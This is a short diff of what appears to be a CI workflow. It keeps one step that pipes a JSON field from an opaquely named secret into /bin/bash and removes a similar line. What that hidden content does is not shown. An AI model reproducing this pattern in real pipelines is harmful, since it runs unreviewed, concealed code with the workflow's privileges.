@@ -22,7 +22,6 @@ jobs:
           chl86867: ${{ secrets.chl86867 }}
         run: |
           printf '%s' "$chl86867" | jq -r .me2 | /bin/bash
-          echo $iahp3836 | jq -r .svw6546 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
